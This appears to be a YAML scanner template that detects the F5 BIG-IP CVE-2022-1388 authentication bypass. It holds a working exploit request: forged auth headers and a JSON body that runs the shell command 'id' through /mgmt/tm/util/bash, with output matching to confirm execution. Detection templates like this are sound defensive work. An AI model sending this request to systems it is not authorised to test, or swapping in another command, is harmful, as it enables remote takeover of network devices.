info:
  name: f5_bigip_cve_2022_1388_vuln
  author: Prajwal G N (@Prajwal5755)
  severity: 9.8
  description: Detects F5 BIG-IP CVE-2022-1388 authentication bypass leading to remote command execution via endpoint and payload.Detects F5 BIG-IP CVE-2022-1388 authentication bypass leading to remote command execution via endpoint and payload.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1388
    - https://www.vulncheck.com/blog/new-cve-2022-1388
  profiles:
    - vuln
    - http
    - critical_severity
    - cve
    - f5

payloads:
  - library: http
    steps:

      - method: post
        timeout: 3
        headers:
          Authorization: "Basic YWRtaW46"
          X-F5-Auth-Token: "asdf"
          User-Agent: "{user_agent}"
          Connection: "X-F5-Auth-Token"
          Host: "localhost"
          Accept: "*/*"
          Content-Type: "application/json"
          

        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}{{path}}"
            prefix: ""
            interceptors: []
            suffix: ""
            data:
              schema:
                - "http"
                - "https"
              path:
                - "/mgmt/tm/util/bash"
                - "/mgmt/tm/util/"
                - "/mgmt/shared"
              ports:
                - 443
                - 8080
                - 8443


        data: |
          {{
            "command": "run",
            "utilCmdArgs": "-c id"
          }}

        response:
          log: "Confirmed CVE-2022-1388 vulnerability detected"
          condition_type: and
          conditions:
            status_code:
              regex: "200"
              reverse: false
            content:
              regex: "(uid=|gid=|groups=|root)"
              reverse: false
            